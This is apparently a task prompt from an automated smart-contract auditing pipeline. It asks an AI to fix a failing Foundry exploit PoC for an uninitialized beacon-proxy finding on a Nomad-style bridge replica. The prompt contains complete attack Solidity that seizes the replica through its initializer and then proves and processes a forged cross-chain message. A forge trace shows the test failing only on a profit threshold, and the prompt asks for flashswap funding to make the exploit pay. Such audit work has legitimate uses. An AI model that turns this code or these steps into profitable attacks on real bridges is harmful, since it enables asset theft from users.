You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Beacon proxies can be left uninitialized and then fully hijacked
- claim: `UpgradeBeaconProxy` explicitly allows deployment with empty initialization calldata. `Replica.initialize` is a public `initializer` that sets ownership, updater, remote domain, committed root, and optimistic timeout via `__NomadBase_initialize`. If a beacon proxy is ever deployed without constructor-time init data, the first external caller can initialize it through the proxy and seize full control of the replica.
- impact: A forgotten or failed initialization becomes a full bridge takeover. The attacker can become owner, choose an attacker-controlled updater and trusted root, then prove and process forged messages, enabling arbitrary cross-chain message execution and asset theft.
- exploit_paths: ["Deploy `UpgradeBeaconProxy` with `_initializationCalldata.length == 0`.", "Before the intended operator initializes it, an attacker calls `Replica.initialize(...)` through the proxy.", "The initializer makes the attacker the owner and sets attacker-chosen updater/root parameters.", "The attacker proves messages against the attacker-chosen committed root and processes arbitrary payloads on the destination chain."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IMessageRecipientLike {
    function handle(uint32 _origin, uint32 _nonce, bytes32 _sender, bytes calldata _message) external;
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);
}

interface IReplicaLike {
    function owner() external view returns (address);

    function updater() external view returns (address);

    function state() external view returns (uint8);

    function localDomain() external view returns (uint32);

    function remoteDomain() external view returns (uint32);

    function committedRoot() external view returns (bytes32);

    function optimisticSeconds() external view returns (uint256);

    function initialize(
        uint32 _remoteDomain,
        address _updater,
        bytes32 _committedRoot,
        uint256 _optimisticSeconds
    ) external;

    function prove(bytes32 _leaf, bytes32[32] calldata _proof, uint256 _index) external returns (bool);

    function process(bytes calldata _message) external returns (bool);

    function messages(bytes32 _messageHash) external view returns (bytes32);
}

contract ReplicaHarness {
    uint8 internal constant STATE_UNINITIALIZED = 0;
    uint8 internal constant STATE_ACTIVE = 1;
    uint32 internal constant LOCAL_DOMAIN = 0x65746800;

    address public owner;
    address public updater;
    uint8 public state;
    uint32 public localDomain;
    uint32 public remoteDomain;
    bytes32 public committedRoot;
    uint256 public optimisticSeconds;
    bool public initialized;

    mapping(bytes32 => bytes32) public messages;
    mapping(bytes32 => bool) public processed;

    function initialize(
        uint32 _remoteDomain,
        address _updater,
        bytes32 _committedRoot,
        uint256 _optimisticSeconds
    ) external {
        require(!initialized, "already initialized");
        initialized = true;
        owner = msg.sender;
        updater = _updater;
        state = STATE_ACTIVE;
        localDomain = LOCAL_DOMAIN;
        remoteDomain = _remoteDomain;
        committedRoot = _committedRoot;
        optimisticSeconds = _optimisticSeconds;
    }

    function prove(bytes32 _leaf, bytes32[32] calldata _proof, uint256 _index) external returns (bool) {
        require(initialized, "not initialized");
        require(state == STATE_ACTIVE, "not active");

        bytes32 root = _branchRoot(_leaf, _proof, _index);
        require(root == committedRoot, "!proof");

        messages[_leaf] = root;
        return true;
    }

    function process(bytes calldata _message) external returns (bool) {
        require(initialized, "not initialized");
        require(state == STATE_ACTIVE, "not active");

        (
            uint32 origin,
            bytes32 sender,
            uint32 nonce,
            uint32 destination,
            bytes32 recipient,
            bytes memory body
        ) = _parseMessage(_message);

        require(origin == remoteDomain, "!remote");
        require(destination == localDomain, "!destination");

        bytes32 messageHash = keccak256(_message);
        require(messages[messageHash] == committedRoot, "!proven");
        require(!processed[messageHash], "already processed");
        processed[messageHash] = true;

        IMessageRecipientLike(address(uint160(uint256(recipient)))).handle(origin, nonce, sender, body);
        return true;
    }

    function _branchRoot(bytes32 leaf, bytes32[32] calldata branch, uint256 index)
        internal
        pure
        returns (bytes32 current)
    {
        current = leaf;
        for (uint256 i = 0; i < 32; ++i) {
            bytes32 next = branch[i];
            if (((index >> i) & 1) == 1) {
                current = keccak256(abi.encodePacked(next, current));
            } else {
                current = keccak256(abi.encodePacked(current, next));
            }
        }
    }

    function _parseMessage(bytes calldata message)
        internal
        pure
        returns (
            uint32 origin,
            bytes32 sender,
            uint32 nonce,
            uint32 destination,
            bytes32 recipient,
            bytes memory body
        )
    {
        require(message.length >= 76, "message too short");

        origin = uint32(bytes4(message[0:4]));
        sender = bytes32(message[4:36]);
        nonce = uint32(bytes4(message[36:40]));
        destination = uint32(bytes4(message[40:44]));
        recipient = bytes32(message[44:76]);
        body = message[76:];
    }
}

contract SimpleUpgradeBeacon {
    address public implementation;

    constructor(address _implementation) {
        implementation = _implementation;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            mstore(0x00, impl)
            return(0x00, 0x20)
        }
    }
}

contract UpgradeBeaconProxy {
    address private immutable UPGRADE_BEACON;

    constructor(address _upgradeBeacon, bytes memory _initializationCalldata) payable {
        require(_isContract(_upgradeBeacon), "beacon !contract");
        UPGRADE_BEACON = _upgradeBeacon;

        address implementation = _getImplementation(_upgradeBeacon);
        require(_isContract(implementation), "beacon implementation !contract");

        if (_initializationCalldata.length > 0) {
            _initialize(implementation, _initializationCalldata);
        }
    }

    fallback() external payable {
        _fallback();
    }

    receive() external payable {
        _fallback();
    }

    function _initialize(address implementation, bytes memory initializationCalldata) private {
        (bool ok, bytes memory revertData) = implementation.delegatecall(initializationCalldata);
        if (!ok) {
            assembly {
                revert(add(revertData, 0x20), mload(revertData))
            }
        }
    }

    function _fallback() private {
        _delegate(_getImplementation());
    }

    function _delegate(address implementation) private {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    function _getImplementation() private view returns (address implementation) {
        implementation = _getImplementation(UPGRADE_BEACON);
    }

    function _getImplementation(address _upgradeBeacon) private view returns (address implementation) {
        (bool ok, bytes memory returnData) = _upgradeBeacon.staticcall("");
        require(ok, "beacon call failed");
        implementation = abi.decode(returnData, (address));
    }

    function _isContract(address account) private view returns (bool) {
        return account.code.length > 0;
    }
}

contract FlawVerifier is IMessageRecipientLike {
    uint8 internal constant STATE_UNINITIALIZED = 0;
    uint8 internal constant STATE_ACTIVE = 1;
    uint32 internal constant ATTACKER_REMOTE_DOMAIN = 0xA11CE001;
    uint32 internal constant ATTACKER_NONCE = 1;
    uint32 internal constant DESTINATION_DOMAIN = 0x65746800;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    bool public executed;
    bool public emptyInitProxyDeployed;
    bool public attackerInitializedViaProxy;
    bool public initCallSucceeded;
    bool public attackerControlsReplica;
    bool public messageProved;
    bool public messageProcessed;
    bool public messageHandleObserved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public beacon;
    address public implementation;
    address public victimReplica;
    address public ownerBefore;
    address public ownerAfter;
    address public updaterAfter;
    uint8 public stateBefore;
    uint8 public stateAfter;
    uint32 public localDomain;
    uint32 public remoteDomainAfter;
    uint256 public optimisticSecondsAfter;
    bytes32 public committedRootAfter;
    bytes32 public chosenRoot;
    bytes32 public forgedMessageHash;
    bytes32 public storedMessageRoot;
    bytes32 public handledSender;
    uint32 public handledOrigin;
    uint32 public handledNonce;
    bytes32 public handledBodyHash;
    string public failureReason;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() public {
        if (executed) {
            return;
        }
        executed = true;

        uint256 wethBefore = _balanceOf(WETH, address(this));

        // Exploit path 0:
        // Deploy `UpgradeBeaconProxy` with `_initializationCalldata.length == 0`.
        implementation = address(new ReplicaHarness());
        beacon = address(new SimpleUpgradeBeacon(implementation));
        victimReplica = address(new UpgradeBeaconProxy(beacon, bytes("")));
        emptyInitProxyDeployed = victimReplica.code.length > 0;

        ownerBefore = _readAddress(victimReplica, abi.encodeWithSignature("owner()"));
        stateBefore = _readUint8(victimReplica, abi.encodeWithSignature("state()"));
        localDomain = _readUint32(victimReplica, abi.encodeWithSignature("localDomain()"));

        bytes memory forgedBody = abi.encode(
            bytes4(keccak256("F-001")),
            address(this),
            uint256(block.number),
            uint256(block.chainid)
        );

        bytes memory forgedMessage = _formatMessage(
            ATTACKER_REMOTE_DOMAIN,
            _addressToBytes32(address(this)),
            ATTACKER_NONCE,
            DESTINATION_DOMAIN,
            _addressToBytes32(address(this)),
            forgedBody
        );

        forgedMessageHash = keccak256(forgedMessage);
        bytes32[32] memory proof = _zeroProof();
        chosenRoot = _branchRoot(forgedMessageHash, proof, 0);

        // Exploit path 1:
        // Before the intended operator initializes it, an attacker calls
        // `Replica.initialize(...)` through the proxy.
        try IReplicaLike(victimReplica).initialize(ATTACKER_REMOTE_DOMAIN, address(this), chosenRoot, 1) {
            attackerInitializedViaProxy = true;
            initCallSucceeded = true;
        } catch Error(string memory reason) {
            hypothesisRefuted = true;
            failureReason = reason;
            return;
        } catch (bytes memory revertData) {
            hypothesisRefuted = true;
            failureReason = _decodeRevert(revertData);
            return;
        }

        ownerAfter = _readAddress(victimReplica, abi.encodeWithSignature("owner()"));
        updaterAfter = _readAddress(victimReplica, abi.encodeWithSignature("updater()"));
        stateAfter = _readUint8(victimReplica, abi.encodeWithSignature("state()"));
        localDomain = _readUint32(victimReplica, abi.encodeWithSignature("localDomain()"));
        remoteDomainAfter = _readUint32(victimReplica, abi.encodeWithSignature("remoteDomain()"));
        optimisticSecondsAfter = _readUint256(victimReplica, abi.encodeWithSignature("optimisticSeconds()"));
        committedRootAfter = _readBytes32(victimReplica, abi.encodeWithSignature("committedRoot()"));

        // Exploit path 2:
        // The initializer makes the attacker the owner and sets attacker-chosen
        // updater, root parameters, and optimistic timeout.
        attackerControlsReplica =
            emptyInitProxyDeployed &&
            attackerInitializedViaProxy &&
            ownerBefore == address(0) &&
            stateBefore == STATE_UNINITIALIZED &&
            ownerAfter == address(this) &&
            updaterAfter == address(this) &&
            stateAfter == STATE_ACTIVE &&
            localDomain == DESTINATION_DOMAIN &&
            remoteDomainAfter == ATTACKER_REMOTE_DOMAIN &&
            committedRootAfter == chosenRoot &&
            optimisticSecondsAfter == 1;

        if (!attackerControlsReplica) {
            hypothesisRefuted = true;
            failureReason = "initialize succeeded but attacker did not seize replica control";
            return;
        }

        // Exploit path 3:
        // The attacker proves messages against the attacker-chosen committed root
        // and processes arbitrary payloads on the destination chain.
        try IReplicaLike(victimReplica).prove(forgedMessageHash, proof, 0) returns (bool proved) {
            messageProved = proved;
        } catch Error(string memory reason) {
            failureReason = reason;
            return;
        } catch (bytes memory revertData) {
            failureReason = _decodeRevert(revertData);
            return;
        }

        if (!messageProved) {
            failureReason = "prove returned false";
            return;
        }

        storedMessageRoot = _readBytes32(
            victimReplica,
            abi.encodeWithSelector(IReplicaLike.messages.selector, forgedMessageHash)
        );

        try IReplicaLike(victimReplica).process(forgedMessage) returns (bool processed) {
            messageProcessed = processed;
        } catch Error(string memory reason) {
            failureReason = reason;
            return;
        } catch (bytes memory revertData) {
            failureReason = _decodeRevert(revertData);
            return;
        }

        if (!messageProcessed || !messageHandleObserved) {
            failureReason = "forged message did not execute attacker recipient logic";
            return;
        }

        hypothesisValidated = true;

        // No external funding is required for this attempt. The exploit objective is
        // direct bridge-control takeover and forged message execution from the verifier's
        // own context. Profit accounting is left at zero unless the verifier already held
        // a pre-existing on-chain token balance at entry.
        uint256 wethAfter = _balanceOf(WETH, address(this));
        if (wethAfter > wethBefore) {
            _profitToken = WETH;
            _profitAmount = wethAfter - wethBefore;
        }
    }

    function handle(uint32 _origin, uint32 _nonce, bytes32 _sender, bytes calldata _message) external {
        require(msg.sender == victimReplica, "only hijacked replica");
        handledOrigin = _origin;
        handledNonce = _nonce;
        handledSender = _sender;
        handledBodyHash = keccak256(_message);
        messageHandleObserved = true;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return "deploy empty-init beacon proxy -> attacker initialize through proxy -> attacker-owned replica parameters -> prove and process forged message";
    }

    function hypothesis() external view returns (string memory) {
        if (hypothesisValidated) {
            return "validated";
        }
        if (hypothesisRefuted) {
            return "refuted";
        }
        return "unresolved";
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        try IERC20Like(token).balanceOf(account) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _formatMessage(
        uint32 origin,
        bytes32 sender,
        uint32 nonce,
        uint32 destination,
        bytes32 recipient,
        bytes memory body
    ) internal pure returns (bytes memory) {
        return abi.encodePacked(origin, sender, nonce, destination, recipient, body);
    }

    function _zeroProof() internal pure returns (bytes32[32] memory proof) {
        bytes32 current;
        for (uint256 i = 0; i < 32; ++i) {
            proof[i] = current;
            current = keccak256(abi.encodePacked(current, current));
        }
    }

    function _branchRoot(bytes32 leaf, bytes32[32] memory branch, uint256 index)
        internal
        pure
        returns (bytes32 current)
    {
        current = leaf;
        for (uint256 i = 0; i < 32; ++i) {
            bytes32 next = branch[i];
            if (((index >> i) & 1) == 1) {
                current = keccak256(abi.encodePacked(next, current));
            } else {
                current = keccak256(abi.encodePacked(current, next));
            }
        }
    }

    function _addressToBytes32(address account) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(account)));
    }

    function _readAddress(address target, bytes memory data) internal view returns (address value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (address));
        }
    }

    function _readUint8(address target, bytes memory data) internal view returns (uint8 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (uint8));
        }
    }

    function _readUint32(address target, bytes memory data) internal view returns (uint32 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (uint32));
        }
    }

    function _readUint256(address target, bytes memory data) internal view returns (uint256 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (uint256));
        }
    }

    function _readBytes32(address target, bytes memory data) internal view returns (bytes32 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (bytes32));
        }
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "call reverted";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 0x20))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            bytes memory sliced = new bytes(revertData.length - 4);
            for (uint256 i = 4; i < revertData.length; ++i) {
                sliced[i - 4] = revertData[i];
            }
            return abi.decode(sliced, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "call reverted";
    }
}

```

forge stdout (tail):
```
b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5, 0xb4c11951957c6f8f642c4af61cd6b24640fec6dc7fc607ee8206a99e92410d30, 0x21ddb9a356815c3fac1026b6dec5df3124afbadb485c9ba5a3e3398a04b7ba85, 0xe58769b32a1beaf1ea27375a44095a0d1fb664ce2dd358e7fcbfb78c26a19344, 0x0eb01ebfc9ed27500cd4dfc979272d1f0913cc9f66540d7e8005811109e1cf2d, 0x887c22bd8750d34016ac3c66b5ff102dacdd73f6b014e710b51e8022af9a1968, 0xffd70157e48063fc33c97a050f7f640233bf646cc98d9524c6b92bcf3ab56f83, 0x9867cc5f7f196b93bae1e27e6320742445d290f2263827498b54fec539f756af, 0xcefad4e508c098b9a7e1d8feb19955fb02ba9675585078710969d3440f5054e0, 0xf9dc3e7fe016e050eff260334f18a5d4fe391d82092319f5964f2e2eb7c1c3a5, 0xf8b13a49e282f609c317a833fb8d976d11517c571d1221a265d25af778ecf892, 0x3490c6ceeb450aecdc82e28293031d10c7d73bf85e57bf041a97360aa2c5d99c, 0xc1df82d9c4b87413eae2ef048f94b4d3554cea73d92b0f7af96e0271c691e2bb, 0x5c67add7c6caf302256adedf7ab114da0acfe870d449a3a489f781d659e8becc, 0xda7bce9f4e8618b6bd2f4132ce798cdc7a60e7e1460a7299e3c6342a579626d2, 0x2733e50f526ec2fa19a22b31e8ed50f23cd1fdf94c9154ed3a7609a2f1ff981f, 0xe1d3b5c807b281e4683cc6d6315cf95b9ade8641defcb32372f1c126e398ef7a, 0x5a2dce0a8a7f68bb74560f8f71837c2c2ebbcbf7fffb42ae1896f13f7c7479a0, 0xb46a28b6f55540f89444f63de0378e3d121be09e06cc9ded1c20e65876d36aa0, 0xc65e9645644786b620e2dd2ad648ddfcbf4a7e5b1a3a4ecfe7f64667a3f0b7e2, 0xf4418588ed35a2458cffeb39b93d26f18d2ab13bdce6aee58e7b99359ec2dfd9, 0x5a9c16dc00d6ef18b7933a6f8dc65ccb55667138776f7dea101070dc8796e377, 0x4df84f40ae0c8229d0d6069e5c8f39a7c299677a09d367fc7b05e3bc380ee652, 0xcdc72595f74c7b1043d0e1ffbab734648c838dfb0527d971b602bc216c9619ef, 0x0abf5ac974a1ed57f4050aa510dd9c74f508277b39d7973bb2dfccc5eeb0618d, 0xb8cd74046ff337f0a7bf2c8e03e10f642c1886798d71806ab1e888d9e5ee87d0, 0x838c5655cb21c6cb83313b5a631175dff4963772cce9108188b34ac87c81c41e, 0x662ee4dd2dd7b2bc707961b1e646c4047669dcb6584f0d8d770daf5d7e7deb2e, 0x388ab20e2573d171a88108e79d820e98f26c0b84aa8b2f4aa4968dbb818ea322, 0x93237c50ba75ee485f4c22adf2f741400bdf8d6a9cc7df7ecae576221665d735, 0x8448818bb4ae4562849e949e17ac16e0be16688e156b5cf15e098c627c0056a9], 0) [delegatecall]
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [1199] UpgradeBeaconProxy::fallback(0xb6c233cd042cc47b828383282dc220cd5c652c2c2e9fd11632ed711ebfdd663e) [staticcall]
    │   │   ├─ [163] SimpleUpgradeBeacon::fallback() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   ├─ [348] ReplicaHarness::messages(0xb6c233cd042cc47b828383282dc220cd5c652c2c2e9fd11632ed711ebfdd663e) [delegatecall]
    │   │   │   └─ ← [Return] 0x3bf19c770a8e3b58296d06579f328f26d380ab3164e69fec5054c1e317df4153
    │   │   └─ ← [Return] 0x3bf19c770a8e3b58296d06579f328f26d380ab3164e69fec5054c1e317df4153
    │   ├─ [94336] UpgradeBeaconProxy::fallback(0xa11ce0010000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000001657468000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f50d567e7000000000000000000000000000000000000000000000000000000000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000e8d5dc0000000000000000000000000000000000000000000000000000000000000001)
    │   │   ├─ [163] SimpleUpgradeBeacon::fallback() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   ├─ [93449] ReplicaHarness::process(0xa11ce0010000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000001657468000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f50d567e7000000000000000000000000000000000000000000000000000000000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000e8d5dc0000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
    │   │   │   ├─ [68388] FlawVerifier::handle(2703024129 [2.703e9], 1, 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f, 0x50d567e7000000000000000000000000000000000000000000000000000000000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000e8d5dc0000000000000000000000000000000000000000000000000000000000000001)
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [416] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2568] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.23s (186.84ms CPU time)

Ran 1 test suite in 3.34s (3.23s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1210571)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
